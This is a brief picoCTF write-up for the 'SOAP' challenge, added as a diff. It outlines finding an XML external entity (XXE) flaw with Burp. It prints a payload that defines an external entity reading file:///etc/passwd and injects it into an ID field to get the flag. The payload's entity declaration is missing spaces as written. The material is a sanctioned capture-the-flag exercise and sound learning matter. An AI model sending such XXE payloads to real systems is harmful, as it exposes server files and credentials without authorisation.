@@ -1,0 +1,19 @@
+picoctf SOAP writeup
+
+1.look its shell code and found its two js function
+
+2.guess it might be a xml injection(xxe)
+
+3.use burp to confirm my guess
+
+4.and use payload => 
+<?xml version="1.0"?>
+
+<!DOCTYPE ANY [
+	<!ENTITYcontent SYSTEM"file:///etc/passwd">]>
+	<data>
+		<ID>
+			&content;
+		</ID>
+	</data>
+5.get all information and flag
